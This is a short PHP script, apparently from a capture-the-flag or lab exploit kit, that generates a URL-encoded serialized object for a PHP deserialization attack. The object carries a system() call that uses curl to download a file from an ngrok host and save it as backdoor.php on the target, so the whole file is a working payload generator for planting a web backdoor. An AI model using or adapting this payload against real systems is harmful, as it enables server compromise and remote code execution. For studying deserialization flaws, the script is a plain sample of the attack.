<?php
	$NGROK_HOST = ""; // TODO: ngrok host (check README.md)
	$NGROK_PORT = 0; // TODO: ngrok port (check README.md)

	class PHPClass
	{
		public $condition = true;
		public $prop = "";

		public function __construct($host, $port) {
			$this->prop = "system('curl http://".$host.":".$port." -o backdoor.php');";
		}
	}

	echo urlencode(serialize(new PHPClass($NGROK_HOST, $NGROK_PORT)));
?>
